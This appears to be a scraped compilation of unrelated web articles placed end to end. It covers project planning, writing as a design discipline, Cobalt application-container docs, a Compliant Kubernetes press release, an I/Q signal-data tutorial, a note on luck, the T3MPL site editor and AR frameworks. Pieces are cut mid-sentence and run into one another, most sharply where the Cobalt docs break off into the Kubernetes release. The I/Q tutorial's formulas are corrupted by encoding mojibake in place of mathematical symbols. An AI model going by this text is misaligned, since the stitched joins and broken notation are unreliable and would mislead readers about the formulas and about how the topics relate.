<p>How hard could it be? I need to display the button in changing light after a delay, and I don’t need to get a board just for that… Welp, I should have started it as soon as I created my project.</p>
<p>As soon as I put all of my ideas and projects into this board, I somehow had clarity on what I was going to do. It was as if I had a clear goal for the project, and I just needed to tweak things here and there.</p>
<p>I think that my underestimation of the hole Planning process as well as having a structure to what my app should do is what really forced me into a corner. You can’t have a clear image of the full project in your head. You need to draw or separate them into blocks to make sure that it makes sense.</p>
<p>I have really been fortunate to realise this at some point as I was very close to scraping the project fully due to things just not working. Guess some hard work pays off. </p>
<p>I think that this taught me a lot and in future, I won't make the same mistake (who am I kidding).</p>
<p>Like always:</p>
<p>Start now. Get perfect later.</p>

        <p>No one should really like job titles.&nbsp;</p>
<p>They can limit an <em>executive</em>’s ability to seize opportunities outside their supposed responsibilities. Awarding one could possibly stunt a person’s desire to continue doing the work that got them there in the first place. Worst of all, their often inflated nature makes people who have special-sounding ones believe that status-signalling is meaningful.</p>
<p>And yet, if you want your work to be significantly better  -  it is time for you to take on another job title.&nbsp;</p>
<p><strong>Writer.</strong></p>
<p>In my current position, my job title is ‘VP of Product’  -  but despite this fancy-sounding title, my professional responsibilities and passion simply make me a product designer. I work primarily on crafting pleasurable and meaningful experiences for people through disciplines such as interaction and usability design, motion design, and high-fidelity prototyping. But if I were to give the most credit to anything for enabling me to produce my best work: it would be the skills I practice when I give myself the title of ‘Writer’.&nbsp;</p>
<p>When I write, I look at my work with the critical eye of a premier ballet teacher. <em>Stop attempting to say so much. Stop using so many unnecessary words. Stop trying to cram so many ideas into one sentence.</em> Writing freezes your ideas for refinement. You’re free to chop and eliminate. To cut down on saying things that don’t add much or that simply don’t need to be said. Its almost as though the simple act of putting words on paper detaches you entirely from your thinking. To meditate on your extensive ideas and prune them like a master bonsai craftsman: with precision and grace.&nbsp;</p>
<p>When I write, a desire for focus and simplicity stirs from within. I cut out well-worded paragraphs and rewrite entire articles. I refuse to settle with <em>impressive</em> as I demand <em>understandable</em>.&nbsp;</p>
<p>This desire pays great dividends to my main profession.&nbsp;</p>
<p>Don Norman, author of two of my favourite books: <a href="https://amzn.to/2G6vwv6" rel="noopener noreferrer" target="_blank"><em>The Design of Everyday Things</em></a> and <a href="https://amzn.to/3316d6y" rel="noopener noreferrer" target="_blank"><em>Emotional Design</em></a>, states that one of the keys to a great design is <strong>Discoverability</strong>. This means that a product allows the user to immediately <em>discover what actions are possible</em> and <em>where and how to perform them</em>.&nbsp;</p>
<p>For a long time, my digital product designs were a combination of anything and everything that had played a significant role in other successful products I studied. This ultimately resulted in overwhelming interfaces. Designs that did too much at once. Screens that forced the user to slow down but only to consider <em>how clever this app was.</em>&nbsp;</p>
<p>A simple and focused product makes the kind of discoverability that Don Norman talks about, easy. But when you’re trying to do everything, much like my clever designs attempted to do, it’s fairly difficult for your users to quickly discover the 1–2&nbsp;<em>important things</em> your product can do or help them achieve.</p>
<p>For your work to be world-class, it often just needs less. That’s true for my designs - and I only learnt that because it’s true for my writing. So add ‘Writer’ to your job title and do the work that goes along with being one. Write a lot. Edit more. Publish frequently. It’ll be hard and it will require many hard hours from you - but it will give anything you create the simplicity and focus that French mathematician Blaise Pascal wish he had, as he once professed: <em>“I’m sorry I wrote you such a long letter; I didn’t have time to write a short one.”</em></p>
<p>***</p>
<p>Don’t hesitate to say hello and so I can see your added job title on Twitter: <a href="https://twitter.com/JustinCampbellP" rel="noopener noreferrer" target="_blank">@justincampbellp</a></p>

<![CDATA[Cobalt – Lightweight Electron Alternative]]>

<br/>
November 18, 2020 | https://cobalt.foo/overview.html | <a href="https://web.archive.org/web/*/https://cobalt.foo/overview.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="centerCol">
      <div id="content">
        <p>Cobalt is a lightweight HTML5/CSS/JS application container that is designed
to provide a rich application development environment with minimal resource
consumption (deployment size, RAM, CPU, GPU). At the same time, Cobalt enables
a rich, low-latency user experience across a wide variety of platforms and
devices.</p>

<h4 id="target-audiences">Target audiences</h4>

<p>Cobalt's documentation is written with two audiences in mind:</p>

<ul>
<li><p><strong>Porters</strong> enable Cobalt to work on other platforms by using Starboard,
Cobalt's porting layer and OS abstraction, to implement the
platform-specific functionality that Cobalt uses. Each Starboard module
(memory, socket, thread, etc.) defines functions that must be implemented
for the porter's platform.</p></li>
<li><p><strong>Developers</strong> want to build applications in familiar environments with
advanced debugging tools without having to worry about compatibility with
a highly fragmented set of browsers. At the same time, they want to have
full control over their codebase so that they can ship features for
constrained platforms, like TVs, on time and without technical risk.</p></li>
</ul>

<h2 id="benefits-of-cobalt">Benefits of Cobalt</h2>

<p>Cobalt significantly reduces the cost of supporting a browser on non-standard
and resource-constrained platforms. In addition, since Cobalt operates at a
consolidated, versioned platform abstraction layer, its porting effort is
man-weeks, and subsequent rebases are near-free.</p>

<p>These are some other benefits that Cobalt provides:</p>

<ul>
<li><p><strong>More platforms</strong></p>

<ul>
<li>  Cobalt does not require platforms to support JIT compilation and can
run on platforms that disallow execution of dynamically generated code.</li>
<li>  Cobalt is a single-process application and does not rely on the ability
to spawn multiple processes.</li>
<li>  Cobalt precompiles a set of shaders that are sufficient to express all
graphical effects, thereby accommodating platforms that cannot compile
shaders at runtime.</li>
<li>  Cobalt requires a compliant C++11 compiler, allowing it to reach
platforms with toolchains that don't support the newest C++17 features.</li>
</ul></li>
<li><p><strong>Small footprint</strong></p>

<ul>
<li>  Cobalt is optimized for memory. Its surface cache never exceeds a
predefined budget, and it never creates duplicate layers, reducing
the likelihood of out-of-memory crashes.</li>
<li>  Cobalt's small binary is designed to take up as little space as
possible. By supporting a subset of HTML5/CSS/JS, Cobalt's reduced
package size even allows bundling of CJK fonts on low-end devices.</li>
</ul></li>
<li><p><strong>Reduced input latency</strong></p>

<ul>
<li>  Cobalt produces consistent 60FPS animations by only supporting
animation of properties that don't affect layout, like <code>transform</code>,
and always running animations on a separate thread.</li>
<li>  Cobalt is optimized to run on single-core CPUs, resulting in better
input latency since the renderer and resource loader do not compete
with layout operations.</li>
<li>  On platforms that support GLES2, Cobalt avoids CPU painting by
performing almost all rendering operations on the GPU.</li>
</ul></li>
</ul>

<h2 id="getting-started">Getting started</h2>

<h3 id="porters">Porters</h3>

<p>Porters should begin with the <a href="https://cobalt.foo/starboard/porting.html">porting guide</a>,
which explains how to use Starboard, Cobalt's porting layer, to customize the
platform-specific functionality that Cobalt uses. There are several reference
documents to help porters customize configuration files and to implement
module-specific functionality. The <a href="https://cobalt.foo/starboard/testing.html">Testing with
NPLB</a> document provides an overview of

Compliant Kubernetes is the first Open Source distribution of Kubernetes specifically designed to address HIPAA, GDPR, CCPA, PCI-DSS, SOC2 and ISO-27001 requirements and now gives individuals and enterprises a fully Open Source solution to address the growing privacy&nbsp; and regulatory demands facing every company delivering Cloud Native solutions.&nbsp;</span></p><p><span>Johan Tordsson, co-founder and CTO of Elastisys said: </span></p><blockquote><p><span>“I’m extremely proud of the great work done by the contributing engineers, coming together as a team to deliver Compliant Kubernetes. The work that has been done will dramatically simplify the implementation of critical compliance needs while preserving the benefit and agility of Kubernetes.”</span></p></blockquote><p><span>Compliant Kubernetes is much more than just Kubernetes. It is a combination of effective open source solutions from the cloud-native community developed to address the key security and access controls needed to meet regulatory compliances. These include:</span></p><ul><li><span>Dex</span><span>: a federated OpenID Connect-compatible identity provider, enabling authentication via, e.g., Active Directory, LDAP, and Google accounts. Dex-issued user identities are used for audit logging and Role-Based Access Control (RBAC) purposes throughout Compliant Kubernetes;</span></li><li><span>Harbor (with Trivy)</span><span>: a private container image registry with vulnerability scanning capabilities, protecting against known threats;</span></li><li><span>Open Policy Agent</span><span>: a cloud-native policy enforcement software, which Compliant Kubernetes configures to automatically enforce controls from various regulations, protecting against misconfiguration errors; and</span></li><li><span>Falco</span><span>: a configurable intrusion detection system (IDS), protecting against unknown threats and hacking attempts.</span></li></ul><p><span>For platform and application observability, Compliant Kubernetes packages and configures:</span></p><ul><li><span>Fluentd, Elasticsearch, and Kibana</span><span>: the high-performance fluentd log forwarding agent ships application and audit logs to a highly secured Elasticsearch instance, powered by the fully open source Open Distro for Elasticsearch. Users can work with these logs via the Kibana interface;</span></li><li><span>Prometheus, Grafana, and AlertManager</span><span>: Compliant Kubernetes uses the community standard monitoring stack, in which Prometheus scrapes and stores metrics and Grafana lets operators create dashboards to monitor Key Performance Indicators (KPI). AlertManager enables operators to get notified via various integrations when KPIs indicate actionable events or application states.</span></li></ul><p><span>Compliant Kubernetes additionally packages networking security-related features, such as the Calico networking provider, NGINX as a high-performance traffic ingress controller, and automatic certificate management via cert-manager. Thus, Compliant Kubernetes is a platform built for regulatory compliance from the ground up. It allows users to meet their needs and easily manage their Kubernetes environment across any supported public cloud, private set of virtual machines (VMWare), or bare metal servers.&nbsp;</span></p><p><span>For customer convenience and peace of mind, Elastisys offers a managed service in public clouds under either US or EU jurisdiction. Tempus AB is a current user of Compliant Kubernetes via Elastisys’ managed services and says: </span></p><blockquote><p><span>“We handle very sensitive data. We decided on Elastisys Compliant Kubernetes as it doesn’t lock you into any cloud, is available under European jurisdiction, is built on best practice from the cloud native community and comes pre-configured for all our security and compliance needs, saving us a lot of effort.”&nbsp;</span></p></blockquote><p><span>Robert Winter, CEO of Elastisys emphasizes Elastsys’ commitment Open Source: </span></p><blockquote><p><span>“Elastisys started the CK8s project because we needed a completely compliant solution to run our Managed Services, but we know the greatest power of Open Source is building a community to share and grow the solution”. </span></p></blockquote><p><span>Robert continues: </span></p><blockquote><p><span>“We stand ready to help any interested party with our Managed Services and support of CK8s, but we also are excited to nurture a healthy and growing community of Open Source users and contributors.”&nbsp;</span></p></blockquote><h2>About Elastisys</h2><p><span>Elastisys develops and manages open source platforms for modern, container based application development.

November 18, 2020 | http://whiteboard.ping.se/SDR/IQ | <a href="https://web.archive.org/web/*/http://whiteboard.ping.se/SDR/IQ">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikitext">
<p>This is a description of using I/Q Data (aka "analytic signal") representing a signal. Since the topic may be quite confusing, I've described the same thing here from different point of views. If you find the information somewhat redundant, it is because it is. Different views may appeal to different readers, and if something seems unclear, keep on reading and it may be more comprehensible later - hopefully.
</p>
<h2>Why I/Q Data?</h2>
<p>I/Q Data is a signal representation much more precise than just using a series of samples of the momentary amplitude of the signal. Have a look at the following signal below.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/cosample.png" alt="Plain signal" title="Plain signal"></p>
<p>This is what you may be used to work with. So why I/Q Data - isn't this good enough?
</p>
<p>Not really. We have a few problems here.
</p>
<ul><li>First, it is impossible to determine the frequency of this signal. Sure, it looks simple enough, just look at the period length? True, but you have no clue if it's a positive or negative frequency since they both generate the same curve. I.e. cos(x) = cos(-x). This becomes a problem working with the signal. Mixing (multiplying) two signals and it'll cause multiple solutions due to the uncertainty of the sign: f1 âŠ— f2 equals f1 + f2 as well as f1 - f2.
</li><li>Second, it's hard to determine the power (peak amplitude, envelope) of the signal. Basically you can only see the peak amplitude here at 0Â°, 180Â°, 360Â° etc, and how do you know the power is the same everywhere else as well? And did you sample the signal exactly at its peak? You really don't know.
</li></ul><p>I/Q Data solves this. Instead of looking at the signal as a flat curve as above, look at it as a corkscrew (helix, spiral, coil spring) in three dimensions.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/corkscrew.png" alt="Complex signal" title="Complex signal"></p>
<hr>
<p>Now if you look at this curve from the side, you'll actually get the same graph as the first one above. Your "real" signal actually is this 2D projection of this corkscrew signal. This is your "I" in I/Q data.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/corkI.png" alt="Side view" title="Side view"></p>
<hr>
<p>Now have a look at the corkscrew from above. This looks quite similar, but as you see, it is out of phase 90Â°  starting at zero, not at one as the other. This this the Q part of your I/Q data.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/corkQ.png" alt="Top view" title="Top view"></p>
<hr>
<p>Now looking at the corkscrew down the time axis you'll see it winds counter-clockwise. This means we know the frequency is positive. It could have wound clockwise as well, still generating the same I-signal (projection) but different Q-signal, representing a negative frequency.
</p>
<p>You also see that the radius of the corkscrew is constant at every sample, if small in I large in Q and vice versa. The radius is the peak amplitude of your signal. 
</p>
<p>The axes are of course 90Â°, so the radius must be equal to (IÂ²+QÂ²)<sup>1/2</sup>. This is the peak amplitude of your signal, and as you can see you know this for each and every sample.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/corkT.png" alt="Viewed down time axis" title="Viewed down time axis"></p>
<h2>What is I/Q Data?</h2>
<p>AS you now understand, the I/Q Data Sample is the coordinates of your signal as seen down the time axis of the corkscrew.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/onesample.png" alt="" title=""></p>
<p>You might object that your signal isn't a pure cosine function as the one we have shown here, and it might be very true. Still, every single sample of your signal can be described as such, i.e. with a peak amplitude times cosine of some phase angle.
</p>
<p>Every single point of your signal can be described as the function Aâ‹…cos(Ï•)
</p>
<p>Since you may freely chose any amplitude A and angle Ï• this must of course be true (as long as the signal is continuous). The value of Aâ‹…cos(Ï•) is the <strong>I</strong> component of the I/Q signal, i.e. your real signal. Note that this only describes your signal in one single point, i.e. one sample. Next sample gives you a new I and Q very likely resulting in another amplitude and/or phase angle, reflecting the modulation of the signal.
</p>
<h2>One sample I/Q Data</h2>
<p>Ok, lets take one sample of I/Q Data and see what it represents. This is also called a phase vector, or phasor.
</p>
<pre>I = 0.69
Q = 0.40
</pre>
<p>Lets draw this in the complex plane.
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/iqdraw1.png" alt="" title=""></p>
<p>Lets see what this tells us about our data point.
</p>
<ul><li>The momentary amplitude of our real signal is by definition <strong>I</strong>, i.e. 0.69
</li><li>Pythagoras tells us the amplitude A of the cosine wave is <code>(0.69Â²+0.40Â²)<sup>1/2</sup> = 0.8</code>
</li><li>Trigonometry tells us our angle is +30Â° into our cosine wave.
</li></ul><p>- <em>Hold it</em>, you say, <em>what cosine wave?</em>
</p>
<p>Well, I/Q actually assumes your real signal (<strong>I</strong>, that is) can be described as the
function <strong>I</strong> = Aâ‹…cos(Ï•)
</p>
<p>Since you are free to chose A and Ï• this must of course be true, as long the function is continuous. Remember we are looking at one single sample now, i.e. one point in time.
</p>
<p>So by using IQ Data we not only get the momentary values of our signal, but the function generating it as well. If we put above together we get:
</p>
<p>The real signal I = 0.8â‹…cos(30Â°)
</p>
<hr>
<ul><li>I/Q Data is the representation (data type) of this cosine function.
</li></ul><p>I/Q Data is the rectangular representation of the polar notation we used above. There is a unique transformation between the two, and the different notations have different properties calculating with them. The rectangular form of I/Q Data is chosen due to the ease of hardware implementations of the most common operations.
</p>
<p>I/Q Data consists of I and Q represented as two separate variables, a vector of length two, or more often, the complex number  I + Q<em>i</em>  (yes, I is the real part).
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/polrep.png" alt="" title=""></p>
<p>Note that the Amplitude above is the waves peak amplitude, not the momentary amplitude.
</p>
<ul><li>I is the current momentary amplitude of the signal (i.e. the Real signal)
</li><li>Q is the momentary amplitude of the signal phase shifted -90Â°.
</li></ul><p>For a simple function such as sine, the phase shift is what the signal was earlier in time, but for a signal with more than one sine component, Q reflects a -90Â° shift of the individual components, and not the composite signal as such. To convert a Real Signal to a I/Q Data Signal, discrete Fourier transformation is required (Hilberts transform).
</p>
<h2>Different ways of representing the same I/Q Data Sample</h2>
<p>There are at least three common ways to represent the I/Q Data Sample. Different representations gives you different pros and cons. Some are more easy to add, other are more easy to multiply etc. This may be important in the implementation, resulting in less complex hardware/software using the best representation.
</p>
<h3>The rectangular form</h3>
<p>The I/Q Data on the form Q and I is called "rectangular" (or "Cartesian") form as it can be viewed as positions in a coordinate system. I and Q are the x and y axis respectively. This is the most common representation you are used to. This form is most common due the ease of modulating/demodulating it in hardware. More about that later.
</p>
<ul><li>As a complex number: I + Q<em>i</em>
</li><li>As a vector [I,Q]
</li><li>Or just the two plain variables I and Q
</li></ul><h3>The polar form</h3>
<ul><li>Amplitude and angle
</li></ul><p>I = Amplitudeâ‹…cos(angle) <br>Q = Amplitudeâ‹…sin(angle)
</p>
<p>The Amplitude is the peak amplitude of the cos (and sin) function, and the angle is how far into the period from zero to 360Â° you are (or 0 to 2Ï€ if you prefers radians).
</p>
<h3>Eulers form</h3>
<p>Since cos(Ï•) + iâ‹…sin(Ï•) = e<sup>iÏ•</sup> we can write our IQ sample as
</p>
<p><span> Ae<sup>iÏ•</sup> </span>
</p>
<p>This might (not?) be the most intuitive representation of the sample. Ï• rotates the angle as seen in the polar representation, and A is of course the amplitude. Realizing this, Eulers identity becomes obvious. Because Ï• is the rotation of the vector in the complex plane, rotating it half a turn, 180Â° or Ï€ radians, results in a real part of -1 and no imaginary part, hence:
</p>
<p><span> e<sup>Ï€i</sup>+1 = 0 </span>
</p>
<p><em>"The student should find this to be immediately obvious,</em> <br><em>otherwise he'll never be a first rate mathematician"</em>
</p>
<p><em>-- Carl Friedrich Gauss </em>
</p>
<h2>Positive versus negative frequency</h2>
<p>It is now easy to see that using I/Q we can represent the signal frequency either as positive or negative. Have a look at the two I/Q signals red and blue below to the left and compare them with their corresponding real projections. It is as obvious they differ in signs in I/Q, as it's impossible to determine the signs using only the real signal component (neither the I nor the Q projection separately).
</p>
<p><img src="http://whiteboard.ping.se/uploads/SDR/freqsign.gif" alt="Positive versus negative frequencies" title="Positive versus negative frequencies"></p>
<p><span>(sidenote: I've put them slightly out of phase compared to each other since else they wouldn't be possible to distinguish at all in the real representation to the right. Also, please note I'm here, quiet unconventional, using the x axis in the phasor for the imaginary <strong>Q</strong>)</span>
</p>
<p>The same signal (well, more or less) in a 3D representation.
</p>
<p>The <strong>I</strong> components (side view):
</p><p><img src="http://whiteboard.ping.se/uploads/SDR/sign-i.png" alt="" title=""></p>
<p>The <strong>Q</strong> components (top view):
</p><p><img src="http://whiteboard.ping.se/uploads/SDR/sign-q.png" alt="" title=""></p>
<p>The I/Q signals in 3D:
</p><p><img src="http://whiteboard.ping.se/uploads/SDR/sign-3d.png" alt="" title=""></p>
<p><a name="twopriceone" id="twopriceone"></a>
As the Nyquistâ€“Shannon sampling theorem states you can only represent
frequencies up to <code>f/2</code> using a samplings rate of <code>f</code>. This is still true
using IQ Data, but since you now can represent negative frequencies
the signal spans <code>[-f/2..+f/2]</code> compared to <code>[0..+f/2]</code> using a â„�eal signal,
hence the range is in effect doubled. Using a
sampling rate of <code>f</code> and you now can represent a signal range of <code>f</code> as well.
Two to the price of one!
</p>
<h2>Mixing and multiplying signals</h2>
<p>Using real signals or IQ Signals gives different results when you multiply them. This is because using only the real component it's not possible to uniquely determine the phase angle of the signal, hence impossible to distinguish a positive frequency from a negative.
</p>
<p><span><img src="http://whiteboard.ping.se/uploads/SDR/mix-real.png" alt="Mixing 10 kHz with 3 kHz using real" title="Mixing 10 kHz with 3 kHz using real"></span></p>
<p>Multiplying two signals f1 and f2 in the real domain:
</p>
<p><span> Â±f1 âŠ— Â±f2 = (Â±)f1 Â± f2 </span>
</p>
<p><span><img src="http://whiteboard.ping.se/uploads/SDR/mix-iq.png" alt="Mixing 10 kHz with 3 kHz using I/Q" title="Mixing 10 kHz with 3 kHz using I/Q"></span></p>
<p>Using IQ Data the signs are now given, and the result is unambiguous:
</p>
<p><span> f1 âŠ— f2 = f1 + f2 </span>
</p>
<p><br>
A frequency spectrum in the real domain usually never show the negative side, since it always must be symmetric around zero due to the uncertainty of the sign of the frequency of the real signal -- hence the parentheses around the sign of <code>f1</code> in the first formula mixing the real signals. I've included the negative side here for illustrative purposes, despite of its redundancy.
</p>
<p>Multiplying two complex number is easiest understood in the polar representation. The amplitude is multiplied and the angle added.
</p>
<p><span> A<sub>1</sub>â‹…e<sup>iÏ•<sub>1</sub></sup>â‹…A<sub>2</sub> e<sup>iÏ•<sub>2</sub></sup> = A<sub>1</sub>A<sub>2</sub> e<sup>i(Ï•<sub>1</sub>+Ï•<sub>2</sub>)</sup> </span>
</p>
<p>Realizing the angle is added under multiplication makes it obvious that the frequencies are added as well.
</p>
<h3>And in time domain ...</h3>
<p>Now let us have a look at this in time domain. To make it easier (doable!) to calculate the DFT in our …</p></div></div>

		<p>It’s a multiplication of <code>x</code> and <code>y</code>.</p>
<p><code>x</code> is how much you are prepared, <code>y</code> is how lucky you are.</p>
<p>You are responsible for the <code>x</code> part of the equation, the <code>y</code> takes care of itself. If your preparation effort is zero, all the potential opportunities will be multiplied by zero and you will lose every one of them, no matter how big they were.</p>
<p>The more prepared you are, the more lucky you become. It’s not because you are lucky, rather because you can multiply small opportunities by big factors.</p>
<hr>
<p>This idea is inspired by Richard W. Hamming’s thoughts on luck, mentioned in his book, <a href="https://msjaber.com/books/the-art-of-doing-science-and-engineering-learning-to-learn/">The Art of Doing Science and Engineering</a>. He walks through all the coincidences that led him to his discoveries. Those coincidences have occured for many people – none of them were prepared, only Hamming was.</p>
<p>Could you have discovered what Hamming did if you were in his position? Yes, only if you were prepared.</p>

		<p><img src="https://t3mpl.n4no.com/content/image/5841gmvz8i7y8mycchzx.png" alt="Generate Website Admin Panel"></p>

<p>Creating admin panel for small website is an expensive thing. Each site has a different structure, and it needs different admin sections. This site has a news section, that doesn't. This site has a landing page with five texts, that site has only one image there. Familiar?</p>
<p>The popular choice to reduce a cost is use Wordpress. But Wordpress is dedicated to blog/news websites. Any deviation from the general purpose of Wordpress means a problem. Of course the market has many plugins and extensions to solve that. Unluckily joining together many elements are difficult and problematic.</p>
<p>So what to do? You may use T3MPL. T3MPL is the generic website editor and the static website generator in one. <strong>When you prepare a template, T3MPL automatically generates editor for your template.</strong></p>
<h4 id="🎹-template-contract">🎹 Template Contract</h4>
<p>Look at <strong>the template contract</strong> bellow. What is it? It is a definition of a data structure in your template. To define that it's needed to create a simple YAML file (template.yaml).</p>
<pre><code>dataContract:
  LANDING:
    sections:
      APP:
        properties:
          TITLE:
            type: (text)
            defaultValue: Hello World
          DESCRIPTION:
            type: (markdown)
            defaultFilePath: content/app-description.md
          PREVIEW:
            type: (image)
            defaultFilePath: assets/app-preview.jpg
            width: 1084
            height: 840
...</code></pre>
<h4 id="👓-template">👓 Template</h4>
<p>You can use that data directly in a template file. Templates are powered by <a href="https://github.com/handlebars-lang/handlebars.js">handlebars</a>.</p>
<pre><code>&lt;div class="landing"&gt;
  &lt;h3&gt;{{LANDING.APP.TITLE}}&lt;/h3&gt;

  {{{$markdown LANDING.APP.DESCRIPTION}}}

  &lt;img src="{{{$image LANDING.APP.PREVIEW}}}" alt="..." /&gt;
&lt;/div&gt;</code></pre>
<h4 id="💥-generic-editor">💥 Generic Editor</h4>
<p>You have everything now. <strong>T3MPL automatically generates an editor for your template.</strong> You may edit your website with live preview now.</p>
<p><img src="https://t3mpl.n4no.com/content/image/xjwaxgk21nnqo5ton12x.png" width="270"></p>

<h4 id="🚀-publishing">🚀 Publishing</h4>
<p>When you finish editing, you may want to publish your website. You can do that in two ways.</p>
<ul>
<li><strong>Publish to .zip file</strong> - T3MPL generates your final website to .zip file. You should upload website files to your server. In this case, your server doesn't have special requirements like PHP or Ruby. Generated files should work on the most popular servers like Apache, Nginx and IIS.</li>
<li><strong>Use T3MPL Server</strong> - if you want to modify your website in a more professional way, you can use T3MPL Server. It requires Node.js on your server. The server allows you to modify your website directly from the editor. In this case, if you click the "publish" button, all changes will be published immediately.</li>
</ul>
<p>So you can use T3MPL according to how often you change your site.</p>
<p>If you have a template and a data you may also generate your website by T3MPL Cli.</p>
<h4 id="📣-summary">📣 Summary</h4>
<p>T3MPL provides a very simple concept, how to connect the data structure, the template and the editor. With T3MPL you don't care about the admin panel because T3MPL creates the admin panel when you create a website template. This saves time a lot. And money.</p>

Also, numerous efforts are devoted to implementing the technology into wearables: helmets, glasses, and contact lenses. Despite them, most people still use AR with the help of smartphones and tablets thanks to better performance, battery life and well, because people always have their smartphones at hand anyway.</p><p> Unfortunately or not, we aren't in <a href="https://www.youtube.com/watch?v=YJg02ivYzSs">this phase of AR development</a> yet. </p><p> Nowadays, AR is mostly used in retail, education, and game development verticals. It's a great tool for adding interactivity, as well as showing your product from all possible angles. For example, <a href="https://apps.apple.com/us/app/ikea-place/id1279244498">IKEA Place</a> shows you how their furniture would look in your room, <a href="https://apps.apple.com/us/app/sketchar-learn-how-to-draw/id1221482822">SketchAR</a> helps you learn to draw, and <a href="https://apps.apple.com/us/app/pok%C3%A9mon-go/id1094591345">Pokemon GO</a> — I guess, everyone knows about Pokemon GO. It's the most renowned app that uses AR as the main feature, after all. </p><p> Depending on the type of trigger, AR can be marker-based, markerless, and location-based. This is a huge theme itself, so I'll focus on markerless AR frameworks in this article. They don't require an image, QR code or location data to work. </p></div></div></div></div></div></div><div id="rec205814304" data-record-type="239" data-bg-color="#161818"><!-- T210 --><div><div><div> <div> <div field="descr"><p>Most ARKit issues come from the decision to rely just on the device power to process AR. On the other hand, ARCore developed by Google relies on cloud services.</p></div> </div> <div><div field="text"><div data-customstyle="yes"><p>To implement AR functionality in apps, developers mostly use either native <a href="https://developer.apple.com/augmented-reality/">ARKit</a> and <a href="https://developers.google.com/ar">ARCore</a> or 3rd party frameworks like <a href="https://developer.vuforia.com/">Vuforia</a>. </p><p>ARKit is an SDK developed by Apple. They lead the way in the AR race at the moment, aim to drive technology adoption and regularly add new features that enhance the quality of the AR experience. For example, the latest iPad Pro even has a LiDAR scanner that is mostly used by self-driving cars to navigate the environment. And there are rumours that Apple plans to present AR glasses soon — a project that Google failed to accomplish. </p><p> Strong points of ARKit include stable tracking, peer-to-peer multiplayer, and realistic reflections. Also, it can hide virtual objects behind a real person, using People Occlusion feature, which helps to avoid breaking immersion. ARKit recognizes even surfaces painted in a single colour like walls or tables — with varying degrees of success. </p><p>As for disadvantages, ARKit is only available for iOS devices with A9 or later processors (A12 and A13 for ARKit 3.5), has difficulties with creating lighting and shadows, and can't occlude objects as it does with people. Moreover, it suffers from a common downside of all AR SDKs: if you try to place a virtual object on an enamelled surface, there's a huge chance it won't be recognised. Most ARKit issues come from the decision to rely just on the device power to process AR. </p><p> On the other hand, ARCore developed by Google relies on cloud services. It helps to achieve better mapping, lighting, occlusion and relocation — but for all of these things to work properly, you need a device from <a href="https://developers.google.com/ar/discover/supported-devices">this list</a> and stable Internet connection. In comparison to ARKit, ARCore falls short on the stability of tracking and might require sensors' calibration due to a huge amount of discrepancies among Android devices. With <a href="https://developers.google.com/ar/develop/unity/quickstart-ios">ARCore SDK for Unity</a>, you can use this engine to create apps for both Android and iOS. </p><p>Vuforia provides even wider devices' support and can be used for the development of iOS, Android, and Universal Windows Platform apps. This framework was developed in 2010 and contributed to the decision of Apple and Google to create ARKit and ARCore. According to <a href="https://appfigures.com/top-sdks/ar_vr/all">AppFigures</a>, it's still the most popular SDK for AR apps. </p></div></div> </div></div></div></div></div><div id="rec205814306" data-record-type="3" data-bg-color="#161818"><!-- T107 --><div> <div itemscope="" itemtype="http://schema.org/ImageObject"><meta itemprop="image" content="https://static.tildacdn.com/tild3136-3264-4535-b433-386565343531/arcore-arkit-vuforia.png"><meta itemprop="caption" content="AppFigures AR frameworks comparison"> <p><img src="https://static.tildacdn.com/tild3136-3264-4535-b433-386565343531/-/empty/arcore-arkit-vuforia.png" data-original="https://static.tildacdn.com/tild3136-3264-4535-b433-386565343531/arcore-arkit-vuforia.png" imgfield="img" alt="AppFigures AR frameworks comparison"> </p></div> </div></div><div id="rec205814308" data-record-type="106" data-bg-color="#161818"><!-- T004 --><div><div> <div><div field="text"><div data-customstyle="yes"><p>Also, Vuforia can use either its own technologies and engine or ARKit/ARCore ones. Thus, even older devices that aren't supported by native SDKs and some AR smart glasses like HoloLens and MagicLeap can use this framework. While Vuforia includes unique features on top of main capabilities similar to native SDKs and has a version baked right into Unity, it's a paid solution and doesn't have the same amount of control over devices' hardware like Apple and Google. </p><p> And of course, all solutions are pretty heavy on the device battery. Markerless AR uses a camera, image recognition, orientation and direction sensors at once. </p></div></div></div></div></div></div><div id="rec205814314" data-record-type="106" data-bg-color="#161818"><!-- T004 --><div><div> <div><div field="text"><div data-customstyle="yes"><p><strong></strong><strong>Shopping </strong><br>The list of ways how AR (and, specifically, AR glasses) can make picking of products easier is incredibly long. For example, imagine a shopping trip to a supermarket with the help of an app that quickly identifies your favourite products on the shelf, compares prices and ingredients, tells you if it fits your diet plan or warns it can cause an allergy response. Or you can come to a dealership and easily compare how a car looks in different colours. </p><p>Also, online shopping will become easier when AR develops enough to get rid of current issues with body tracking. Most frameworks recognise only faces, and the virtual try-on is already used by companies like NYX Cosmetics and L'Oreal Paris to show their make-up products. However, right now there's no easily accessible way to check how clothes would look on you — but the technology is definitely on its way. </p><p> <strong>Augmented social media </strong><br>Instagram and Snapchat already compete in this field and even created their own frameworks, Spark AR and Lens Studio, to add filters, masks and 3D models to photos and videos. It's highly likely AR will be used in social media ads as well. For example, we can expect a virtual try-on feature right after seeing an ad: it should greatly drive the product sales, help influencers to market them, and decrease a chance you'll buy something online that doesn't fit you. </p><p> <strong>Navigation </strong><br>Google Maps introduced <a href="https://support.google.com/maps/thread/11554255?hl=en">Live View</a> last year. It's an AR mode that allows seeing both a traditional map and AR arrows pointing you in the right direction. It looks like a prototype and doesn't seem handy even during walking: personally, I'll be tired in ten minutes holding a phone in front of me. Regardless, it shows pretty well what visuals AR glasses can use to help us find a way somewhere. </p><p> <strong>Manufacturing and User manuals <br></strong>IKEA manuals are incredibly comprehensible but when AR shows you where and how to install it, it's even easier to assemble something. And if you ever felt anxious about numerous indicators in a car, <a href="https://www.youtube.com/watch?v=qOMvl6-cP7o">apps like this</a> explain what they mean. Again, a smartphone isn't the best platform for such features — but it shows how we can augment the visual information and make a learning curve easier for customers and workers. </p><p>The list 